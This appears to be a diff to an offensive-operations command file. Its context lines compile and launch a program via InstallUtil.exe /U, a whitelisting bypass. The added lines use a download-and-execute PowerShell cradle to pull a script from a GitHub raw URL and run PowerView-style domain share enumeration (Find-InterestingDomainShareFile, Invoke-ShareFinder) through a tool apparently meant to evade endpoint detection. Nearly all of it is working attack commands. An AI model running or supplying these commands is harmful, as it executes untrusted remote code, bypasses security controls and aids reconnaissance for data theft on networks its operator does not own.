@@ -2,6 +2,10 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /r:C:\Windows\Microsoft.
 
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /U Tester.exe
 
+PowerShellEDR /command:"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/creationstation123/X/main/p.txt');Find-InterestingDomainShareFile"
+
+PowerShellEDR /command:"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/creationstation123/X/main/p.txt');Invoke-ShareFinder"
+
 
 
 
